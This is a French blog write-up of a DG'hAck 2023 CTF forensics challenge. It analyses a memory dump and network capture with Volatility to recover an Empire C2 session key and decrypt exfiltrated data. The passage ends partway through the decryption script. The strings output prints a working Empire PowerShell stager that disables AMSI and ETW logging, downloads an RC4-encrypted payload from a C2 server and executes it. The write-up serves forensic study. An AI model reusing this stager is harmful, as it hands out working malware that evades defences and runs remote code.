@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <script defer data-domain="itarow.xyz" src="https://plausible.itarow.xyz/js/plausible.js"></script>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> DG&#39;hAck 2023 - L&#39;an 1, et puis l&#39;an 2 - Shinji &amp; Itarow | Itarow</title>
+  <link rel = 'canonical' href = 'https://blog.itarow.xyz/posts/l_an_1_et_puis_l_an_2/'>
+  <meta name="description" content="CS student, writing some write up of cool CTF&#39;s challenges and infosec content.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="DG&#39;hAck 2023 - L&#39;an 1, et puis l&#39;an 2 - Shinji &amp; Itarow" />
+<meta property="og:description" content="Solution du challenge &ldquo;L&rsquo;an 1, et puis l&rsquo;an 2&rdquo; créé pour le DG&rsquo;hAck 2023.
+Description Sur le réseau de l&rsquo;entreprise d&rsquo;un ami, un employé a lancé un fichier inconnu provenant d&rsquo;une clé USB. Apeuré, il s&rsquo;est rendu à la DSI qui a réalisé un dump mémoire de la machine par précaution. Selon-eux il n&rsquo;y a rien à craindre, la machine n&rsquo;est pas compromise.
+Mais quelques temps après avoir rebranché son PC sur le réseau, l&rsquo;employé s&rsquo;est mis à perdre certains de ses fichiers, pris de panique il a éteint sa machine." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.itarow.xyz/posts/l_an_1_et_puis_l_an_2/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-30T19:48:07+01:00" />
+<meta property="article:modified_time" content="2023-11-30T19:48:07+01:00" />
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="DG&#39;hAck 2023 - L&#39;an 1, et puis l&#39;an 2 - Shinji &amp; Itarow"/>
+<meta name="twitter:description" content="Solution du challenge &ldquo;L&rsquo;an 1, et puis l&rsquo;an 2&rdquo; créé pour le DG&rsquo;hAck 2023.
+Description Sur le réseau de l&rsquo;entreprise d&rsquo;un ami, un employé a lancé un fichier inconnu provenant d&rsquo;une clé USB. Apeuré, il s&rsquo;est rendu à la DSI qui a réalisé un dump mémoire de la machine par précaution. Selon-eux il n&rsquo;y a rien à craindre, la machine n&rsquo;est pas compromise.
+Mais quelques temps après avoir rebranché son PC sur le réseau, l&rsquo;employé s&rsquo;est mis à perdre certains de ses fichiers, pris de panique il a éteint sa machine."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://blog.itarow.xyz/css/styles.4dd8e96d6c0d53a6965a5a357c26fc29f6b838ad352dc5acda0754ff4b9409e5c58fa94716892c2a5d6a7e1b1bef8fbcaf2442656e81dfae00dc9464d707477d.css" integrity="sha512-TdjpbWwNU6aWWlo1fCb8Kfa4OK01LcWs2gdU/0uUCeXFj6lHFoksKl1qfhsb74&#43;8ryRCZW6B364A3JRk1wdHfQ=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://blog.itarow.xyz/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/categories">Categories</a></li>
+         
+        <li><a href="/whoami">Whoami</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://blog.itarow.xyz/posts/pacapable/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&text=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&title=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&is_video=false&description=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&title=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&title=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&name=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow&description=Solution%20du%20challenge%20%26ldquo%3bL%26rsquo%3ban%201%2c%20et%20puis%20l%26rsquo%3ban%202%26rdquo%3b%20cr%c3%a9%c3%a9%20pour%20le%20DG%26rsquo%3bhAck%202023.%0aDescription%20Sur%20le%20r%c3%a9seau%20de%20l%26rsquo%3bentreprise%20d%26rsquo%3bun%20ami%2c%20un%20employ%c3%a9%20a%20lanc%c3%a9%20un%20fichier%20inconnu%20provenant%20d%26rsquo%3bune%20cl%c3%a9%20USB.%20Apeur%c3%a9%2c%20il%20s%26rsquo%3best%20rendu%20%c3%a0%20la%20DSI%20qui%20a%20r%c3%a9alis%c3%a9%20un%20dump%20m%c3%a9moire%20de%20la%20machine%20par%20pr%c3%a9caution.%20Selon-eux%20il%20n%26rsquo%3by%20a%20rien%20%c3%a0%20craindre%2c%20la%20machine%20n%26rsquo%3best%20pas%20compromise.%0aMais%20quelques%20temps%20apr%c3%a8s%20avoir%20rebranch%c3%a9%20son%20PC%20sur%20le%20r%c3%a9seau%2c%20l%26rsquo%3bemploy%c3%a9%20s%26rsquo%3best%20mis%20%c3%a0%20perdre%20certains%20de%20ses%20fichiers%2c%20pris%20de%20panique%20il%20a%20%c3%a9teint%20sa%20machine." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fl_an_1_et_puis_l_an_2%2f&t=DG%27hAck%202023%20-%20L%27an%201%2c%20et%20puis%20l%27an%202%20-%20Shinji%20%26%20Itarow" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#description">Description</a></li>
+    <li><a href="#solution">Solution</a>
+      <ul>
+        <li><a href="#extraction-de-la-session-key-grâce-au-dump-mémoire">Extraction de la session key grâce au dump mémoire</a></li>
+        <li><a href="#à-la-recherche-de-liv">À la recherche de l&rsquo;IV</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        DG&#39;hAck 2023 - L&#39;an 1, et puis l&#39;an 2 - Shinji &amp; Itarow
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2023-11-30 19:48:07 &#43;0100 CET" itemprop="datePublished">2023-11-30</time>
+          
+        </div>
+        
+        
+        <div class="article-read-time">
+          <i class="far fa-clock"></i>
+          
+          6 minute read
+        </div>
+        
+        
+        <div class="article-category">
+            <i class="fas fa-archive"></i>
+            
+            
+            <a class="category-link" href="/categories/dghack-2023">DGhAck 2023</a>
+            
+        </div>
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/forensic" rel="tag">Forensic</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/ctf" rel="tag">CTF</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p>Solution du challenge &ldquo;L&rsquo;an 1, et puis l&rsquo;an 2&rdquo; créé pour le DG&rsquo;hAck 2023.</p>
+<h2 id="description">Description</h2>
+<p>Sur le réseau de l&rsquo;entreprise d&rsquo;un ami, un employé a lancé un fichier inconnu provenant d&rsquo;une clé USB. Apeuré, il s&rsquo;est rendu à la DSI qui a réalisé un dump mémoire de la machine par précaution. Selon-eux il n&rsquo;y a rien à craindre, la machine n&rsquo;est pas compromise.</p>
+<p>Mais quelques temps après avoir rebranché son PC sur le réseau, l&rsquo;employé s&rsquo;est mis à perdre certains de ses fichiers, pris de panique il a éteint sa machine.</p>
+<p>Heureusement, la DSI met en place une capture du réseau constante.</p>
+<p>Avec ces deux captures, votre objectif est d&rsquo;aider la DSI à comprendre ce qu&rsquo;il s&rsquo;est passé et de retrouver le contenu du précieux fichier !</p>
+<h2 id="solution">Solution</h2>
+<p>Premièrement on réalise une première analyse de la capture mémoire avec volatility2 et 3 avec l&rsquo;utilisation des plugins basiques (listing des process &amp; fichiers)</p>
+<pre tabindex="0"><code>$ vol3.py -f ./dump.raw windows.pstree.PsTree
+[...]
+** 3992 3940    explorer.exe    0xe70f79fc52c0  71      -       1       False   2023-07-08 19:09:11.000000      N/A
+*** 5888        3992    SecurityHealth  0xe70f7a303080  6       -       1       False   2023-07-08 19:09:24.000000      N/A
+*** 1960        3992    vm3dservice.ex  0xe70f7a526080  1       -       1       False   2023-07-08 19:09:26.000000      N/A
+*** 8112        3992    photoshop.exe   0xe70f7a9f5080  18      -       1       False   2023-07-08 19:13:29.000000      N/A
+*** 7288        3992    msedge.exe      0xe70f7afb2340  36      -       1       False   2023-07-08 19:12:27.000000      N/A
+**** 3996       7288    msedge.exe      0xe70f74d95080  18      -       1       False   2023-07-08 19:12:27.000000      N/A
+**** 3212       7288    msedge.exe      0xe70f7a1e2080  7       -       1       False   2023-07-08 19:12:27.000000      N/A
+[...]
+</code></pre><p>On aperçoit un processus <code>photoshop.exe</code> qui paraît suspect et pourrait être le binaire lancé par l&rsquo;employé.</p>
+<p>On le dump avec volatility :</p>
+<pre tabindex="0"><code>$ vol3.py -f ./dump.raw windows.filescan.FileScan | grep photoshop
+0xe70f7a10a170.0\Users\cesar\Desktop\photoshop.exe      216
+0xe70f7a24a170  \PSHost.133333172090291031.8112.DefaultAppDomain.photoshop      216
+0xe70f7bae0130  \Users\cesar\Desktop\photoshop.exe      216
+0xe70f7d08a900  \Users\cesar\Desktop\photoshop.exe      216
+$ vol3.py -f ./dump.raw windows.dumpfiles.DumpFiles --virtaddr 0xe70f7a10a170
+Volatility 3 Framework 2.4.0
+Progress:  100.00               PDB scanning finished
+Cache   FileObject      FileName        Result
+DataSectionObject       0xe70f7a10a170  photoshop.exe   file.0xe70f7a10a170.0xe70f7975faf0.DataSectionObject.photoshop.exe.dat
+ImageSectionObject      0xe70f7a10a170  photoshop.exe   file.0xe70f7a10a170.0xe70f7a15fcc0.ImageSectionObject.photoshop.exe.img
+$ file file.0xe70f7a10a170.0xe70f7975faf0.DataSectionObject.photoshop.exe.dat
+file.0xe70f7a10a170.0xe70f7975faf0.DataSectionObject.photoshop.exe.dat: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
+</code></pre><p>Un strings rapide nous permet d&rsquo;obtenir la payload powershell lancée :</p>
+<pre tabindex="0"><code>$ strings file.0xe70f7a10a170.0xe70f7975faf0.DataSectionObject.photoshop.exe.dat
+[...]
+If($PSVersionTable.PSVersion.Major -ge 3){$Ref=[Ref].Assembly.GetType(&#39;System.Management.Automation.AmsiUtils&#39;);$Ref.GetField(&#39;amsiInitFailed&#39;,&#39;NonPublic,Static&#39;).Setvalue($Null,$true);[System.Diagnostics.Eventing.EventProvider].GetField(&#39;m_enabled&#39;,&#39;NonPublic,Instance&#39;).SetValue([Ref].Assembly.GetType(&#39;System.Management.Automation.Tracing.PSEtwLogProvider&#39;).GetField(&#39;etwProvider&#39;,&#39;NonPublic,Static&#39;).GetValue($null),0);};[System.Net.ServicePointManager]::Expect100Continue=0;$wc=New-Object System.Net.WebClient;$u=&#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;;$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(&#39;aAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMAAuADIAOgA4ADAAOAAwAA==&#39;)));$t=&#39;/admin/get.php&#39;;$wc.Headers.Add(&#39;User-Agent&#39;,$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes(&#39;Td:b0uCNi#W}L7!@qFk](^f&amp;.=?3re;G&#39;);$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};$wc.Headers.Add(&#34;Cookie&#34;,&#34;DDCCFsKOAD=Uns/XCBDMk0lmDUO2PfJlWwUEG0=&#34;);$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](&amp; $R $data ($IV+$K))|IEX
+[...]
+</code></pre><p>Nous pouvons donc nous attarder désormais sur le dump réseau.</p>
+<p>En parcourant la capture réseau, nous voyons du traffic sur les endpoints <code>/admin/get.php</code>, <code>/login/process.php</code>, <code>/news.php</code>.</p>
+<p>Après une brève recherche sur internet on comprend que nous sommes face à des payloads Empire.</p>
+<p>L&rsquo;objectif étant de récupérer le contenu d&rsquo;un fichier, il va nous falloir déchiffrer les communications pour voir la donnée exfiltrée.</p>
+<p>Suite à une recherche Google on tombe sur <a href="https://www.keysight.com/blogs/tech/nwvs/2021/06/16/empire-c2-networking-into-the-dark-side">cet article</a> expliquant le fonctionnement des communications EmpireC2.</p>
+<p>Dans cet article nous avons un schéma expliquant le chiffrement :</p>
+<p><img src="/img/l1l2/schema.png" alt=""></p>
+<p>D&rsquo;après notre capture réseau on comprend que les données transmises en POST par la victime sont celles que nous allons devoir déchiffrer.</p>
+<p>Ces données se trouvent sur notre schéma dans la partie <code>Rest</code>, plus précisément dans le <code>Task Data</code> qui est le dernier élément du message chiffré.</p>
+<p>Ce déchiffrement comme expliqué sur le schéma s&rsquo;effectue à l&rsquo;aide de la Session Key. (La staging key ne servant que pour l&rsquo;initialisation de la communication et chiffrer certaines informations complémentaires notamment le type de requête)</p>
+<p>Dans l&rsquo;article il est fait mention de cette session key</p>
+<blockquote>
+<p>But, by diving into Empire’s code, we were able to figure out that the payload was in fact RSA encrypted with that RSA public key and the payload that was being sent was a 16 Bytes numeric nonce and 32 Bytes Session key concatenated which looked something like this –
+<img src="/img/l1l2/session_key.png" alt=""></p>
+</blockquote>
+<p>L&rsquo;envoie de cette clé est réalisée par le client et chiffré grâce à la clé publique du serveur, il n&rsquo;est donc pas possible de pouvoir récupérer la clé privée de celui-ci statiquement avec l&rsquo;échange des communications.</p>
+<p>Il est donc nécessaire de la trouver en mémoire, étant génerée de façon aléatoire et écrite nulle part ailleurs.</p>
+<p>Le dump mémoire est donc ce qu&rsquo;il nous faut pour la trouver !</p>
+<h3 id="extraction-de-la-session-key-grâce-au-dump-mémoire">Extraction de la session key grâce au dump mémoire</h3>
+<p>Nous pouvons dump précisément dump en mémoire le processus <code>photoshop.exe</code> avec volatility2 afin d&rsquo;avoir plus de précisions sur notre recherche :</p>
+<pre tabindex="0"><code>$ vol.py -f dump.raw --profile=Win10x64_19041 memdump --pid=8112 --dump-dir=.
+Volatility Foundation Volatility Framework 2.6.1
+************************************************************************
+Writing photoshop.exe [  8112] to 8112.dmp
+</code></pre><p>Il nous reste désormais à réaliser un grep avec les données que nous connaissons. Nous savons que la session key est composée d&rsquo;un Nonce de 16 chiffres ainsi que 32 caractères imprimables, voici donc la commande qui nous permet de la récuperer :</p>
+<pre tabindex="0"><code>$ strings -el 8112.dmp | grep -o -P &#39;[0-9]{16}[\x00-\x7F]{32}&#39;  | uniq -u
+133333172090291031.8112.DefaultAppDomain.photosh
+3949070969871305e\Z6a3xGr|B-n?9u@5iN8)/q4w&amp;{b+0m
+002400000480000094000000060200000024000052534131
+0004000001000100B5FC90E7027F67871E773A8FDE8938C8
+[...]
+</code></pre><p>L&rsquo;option <code>-el</code> de strings permet de récupérer les chaînes de caractères UTF-16. Sans cette option, la clé n&rsquo;apparaîtra pas car elle est en UTF-16 dans la mémoire.</p>
+<p>On obtient pas mal de résultats avec beaucoup de faux positifs mais on repère à l&rsquo;allure rapidement la clé de session qui est donc la deuxième ligne du résultat de notre commande : <code>3949070969871305e\Z6a3xGr|B-n?9u@5iN8)/q4w&amp;{b+0m</code></p>
+<p>Si on veut être plus méthodique, on peut passer par l&rsquo;entropie pour plus de précision, avec un script comme celui-ci :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> collections <span style="color:#f92672">import</span> Counter
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> math <span style="color:#f92672">import</span> log
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">entropy</span>(string):
+</span></span><span style="display:flex;"><span>    counts <span style="color:#f92672">=</span> Counter(string)
+</span></span><span style="display:flex;"><span>    frequencies <span style="color:#f92672">=</span> ((i <span style="color:#f92672">/</span> len(string)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> counts<span style="color:#f92672">.</span>values())
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span> sum(f <span style="color:#f92672">*</span> log(f, <span style="color:#ae81ff">2</span>) <span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> frequencies)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">by_entropy</span>(candidate):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> candidate[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>candidates <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;./candidates&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    line <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>rstrip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> line:
+</span></span><span style="display:flex;"><span>        candidates<span style="color:#f92672">.</span>append((entropy(line),line))
+</span></span><span style="display:flex;"><span>        line <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>rstrip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> sorted(candidates, key<span style="color:#f92672">=</span>by_entropy, reverse<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Entropy: </span><span style="color:#e6db74">{</span>res[i][<span style="color:#ae81ff">0</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74"> / Key: </span><span style="color:#e6db74">{</span>res[i][<span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span></code></pre></div><h3 id="à-la-recherche-de-liv">À la recherche de l&rsquo;IV</h3>
+<p>Pour parachever notre déchiffrement il nous manque encore l&rsquo;IV. En regardant dans le code source d&rsquo;Empire et plus précisément dans le module de chiffrement on remarque quelque chose d&rsquo;intéressant.</p>
+<p><img src="/img/l1l2/aes_encrypt.png" alt=""></p>
+<p>La fonction <code>aes_encrypt</code> est utilisée par la fonction <code>aes_encrypt_then_hmac</code> par les agents Empire. En regardant cette fonction de plus près on apprend également que le hmac du payload chiffré est ajouté à la fin du message qui sera envoyé au C2.</p>
+<p><img src="/img/l1l2/aes_encrypt_then_mac.png" alt=""></p>
+<p>En effet, l&rsquo;IV est statique et est renvoyé dans le payload chiffré pour permettre le déchiffrement par le serveur.</p>
+<p>Nous avons donc notre clé et notre IV. Il nous suffit d&rsquo;écrire un script permettant le déchiffrement en prenant bien en compte le format du payload empire. C&rsquo;est à dire, les 20 premiers bytes pour le déchiffrement de la partie servant d&rsquo;identifiant à la tâche en cours. Les 16 bytes suivants étant l&rsquo;IV, le reste étant le contenu chiffré.</p>
+<p>Voici le script permettant d&rsquo;extraire tout le contenu exfiltré par l&rsquo;attaquant :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pyshark
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> ARC4
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> pad,unpad
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cap <span style="color:#f92672">=</span> pyshark<span style="color:#f92672">.</span>FileCapture(<span style="color:#e6db74">&#39;capture.pcapng&#39;</span>, display_filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http.request.method == &#34;POST&#34;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>STAGING_KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;STAGING_KEY&#39;</span>
+</span></span><span style="display:flex;"><span>SESSION_KEY <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;SESSION_KEY&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decipher_rc4</span>(dec):
+</span></span><span style="display:flex;"><span>    rc4_key <span style="color:#f92672">=</span> dec[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">+</span> STAGING_KEY
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> ARC4<span style="color:#f92672">.</span>new(rc4_key)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> cipher<span style="color:#f92672">.</span>decrypt(dec[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">19</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decipher_packet</span>(data):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Entête identifiant la tâche en cours</span>
+</span></span><span style="display:flex;"><span>    task <span style="color:#f92672">=</span> data[:<span style="color:#ae81ff">20</span>]
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> data[<span style="color:#ae81ff">20</span>:]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    IV <span style="color:#f92672">=</span> payload[:<span style="color:#ae81ff">16</span>]
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># -10 pour retirer le HMAC ajouté par la fonction aes_encrypt_then_hmac</span>
+</span></span><span style="display:flex;"><span>    ciphertext <span style="color:#f92672">=</span> payload[<span style="color:#ae81ff">16</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    aes <span style="color:#f92672">=</span> AESCipher(SESSION_KEY,IV)
+</span></span><span style="display:flex;"><span>    cleartext <span style="color:#f92672">=</span> unpad(aes<span style="color:#f92672">.</span>decrypt(ciphertext), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> cleartext
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AESCipher</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self,key,IV):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> key
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>IV <span style="color:#f92672">=</span> IV
+</span></span><span style="display:flex;"><span>        AES<span style="color:#f92672">.</span>block_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(self,data):
